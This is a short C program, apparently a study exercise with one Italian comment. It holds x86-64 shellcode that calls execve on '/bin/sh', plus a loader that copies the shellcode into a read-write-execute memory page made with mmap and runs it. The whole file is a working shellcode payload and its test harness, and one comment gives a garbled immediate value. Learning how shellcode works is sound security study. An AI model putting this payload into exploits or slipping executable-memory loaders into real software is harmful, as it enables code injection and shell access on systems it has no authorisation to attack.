#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {

    unsigned char payload[] = {
        0x48, 0x31, 0xf6,                   // xor rsi, rsi
        0x48, 0x31, 0xd2,                   // xor rdx, rdx
        0x48, 0xbb, 0xff, 0x2f, 0x62, 0x69, // mov rbx, 0x69622f2ff
        0x6e, 0x2f, 0x73, 0x68,
        0x48, 0xc1, 0xeb, 0x08,             // shr rbx, 8
        0x53,                               // push rbx
        0x48, 0x89, 0xe7,                   // mov rdi, rsp
        0x48, 0x31, 0xc0,                   // xor rax, rax
        0xb0, 0x3b,                         // mov al, 0x3b (execve syscall number)
        0x0f, 0x05                          // syscall
    };
    
    void *exec = mmap(
        NULL,
        sizeof(payload),
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, //map_anonymus serrve a dire che non c'è un file ma solo ram
        -1,
        0
    ); 
    
    if (exec == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    memcpy(exec, payload, sizeof(payload));
    
    void (*func)() = (void (*)())exec;
    func();
    
    
    return 0;
}